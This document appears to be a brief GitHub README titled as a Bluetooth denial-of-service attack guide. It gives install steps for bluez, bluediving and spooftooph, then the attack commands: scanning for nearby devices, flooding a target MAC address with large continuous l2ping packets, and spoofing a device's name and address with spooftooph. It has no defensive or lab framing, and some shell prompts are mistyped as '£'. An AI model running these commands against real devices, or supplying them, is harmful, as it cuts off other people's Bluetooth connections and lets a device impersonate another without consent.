# Bluetooth Denial-of-Service (DoS) attack

![image](https://github.com/user-attachments/assets/6ab90148-eea2-45bc-8724-23fd989ec4a9)

##   Install the tools
For a DoS attack over Bluetooth, you can use tools like:

l2ping (already included in bluez)

spooftooph (for spoofing and spam)

bluediving (for specific attacks like L2CAP overflow)

## 1.comands 
```shell
$ sudo apt update
£ sudo apt install bluez blueranger
```

## 2. Activate and check the Bluetooth adapter

```shell
$ sudo systemctl start bluetooth
£ sudo hciconfig hci0 up
£ hciconfig hci0
```

## 3.Bluetooth DoS con l2ping (inondazione di ping)

```shell
$ sudo hcitool scan
```
Flood (continuous ping):
```shell
$ sudo l2ping -i hci0 -s 600 -f XX:XX:XX:XX:XX:XX
```

## More advanced attacks (with Bluediving)

```shell
$ sudo apt install bluediving
```

## Spoofing identity (with spooftooph)

```shell
$ sudo apt install spooftooph
```
for example
```shell
$ sudo spooftooph -i hci0 -n "Insert your device" -a XX:XX:XX:XX:XX:XX
```
